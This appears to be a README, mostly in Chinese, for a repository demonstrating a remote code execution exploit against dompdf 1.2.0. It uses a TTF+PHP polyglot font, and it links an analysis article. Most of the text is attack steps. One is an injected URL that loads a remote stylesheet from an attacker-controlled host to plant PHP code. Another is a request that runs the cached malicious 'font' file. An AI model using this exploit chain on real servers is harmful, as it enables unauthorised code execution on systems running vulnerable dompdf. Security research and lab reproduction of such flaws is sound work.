# RCE exploit for dompdf

该存储库包含一个使用 dompdf 1.2.0 的易受攻击的演示应用程序和一个通过 ttf+php 多语言文件实现远程代码执行的漏洞利用程序。

![Exploit Overview](exploit/overview.png)

分析文章:https://positive.security/blog/dompdf-rce

## Instructions

1. application文件夹为漏洞环境，需要使用php7.0环境

2. 调用远程css，写入恶意php代码
```
http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://vpsip:9001/exploit.css'>
```

3. 访问缓存的php "font"文件并执行phpinfo()
```
http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php
```
